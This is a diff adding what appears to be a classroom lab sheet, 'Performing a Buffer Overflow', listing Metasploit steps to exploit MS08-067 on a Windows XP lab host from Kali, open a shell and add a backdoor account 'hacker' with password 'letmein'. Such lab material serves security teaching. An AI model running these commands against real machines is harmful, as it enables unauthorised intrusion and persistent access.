@@ -1,0 +1,29 @@
+Activity 2.5.1 - Performing a Buffer Overflow
+
+ipconfig
+
+ifconfig
+ping <XP-PRO IP>
+Ctrl+c
+
+search exploit ms08-067
+use 0
+ (alternatively: use exploit/windows/smb/ms08_067_netapi)
+info
+show options
+set RHOSTS <XP-PRO IP>
+set LHOST <Kali IP>
+show options
+exploit
+
+netstat -nao
+
+net user 
+
+shell
+net user
+net user hacker letmein /add
+
+netstat -na
+
+exit
